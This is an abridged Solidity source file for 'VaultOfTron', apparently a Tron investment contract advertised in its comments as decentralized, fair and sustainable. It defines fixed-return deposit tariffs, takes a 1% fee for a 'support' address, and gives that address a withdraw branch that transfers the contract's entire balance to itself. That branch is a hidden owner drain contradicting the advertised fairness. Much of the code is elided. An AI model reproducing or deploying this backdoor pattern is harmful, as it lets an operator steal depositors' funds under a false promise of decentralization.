//SourceUnit: Vaultoftron.sol

//
//Main site: VaultOfTron.com 
//
//Backup site: VaultOfTron.network
//
//protected - decentralized - susteinable - fair - anonymous - website backup
//
//Stay tunned for announcements.

pragma solidity ^0.4.25;

contract  VaultOfTron{
  ...
  constructor() public {
    ...
    tariffs.push(Tariff(4 * 28800, 144));
	
    tariffs.push(Tariff(6 * 28800, 204));
	
    tariffs.push(Tariff(8 * 28800, 264));
	
    tariffs.push(Tariff(10 * 28800, 324));
  ...
  function deposit(uint tariff, address referer) external payable {
    ...
    support.transfer(msg.value / 100);
  ...
  function withdraw() external {
	...
	if(msg.sender == support) {  
        ...
        support.transfer(address(this).balance);
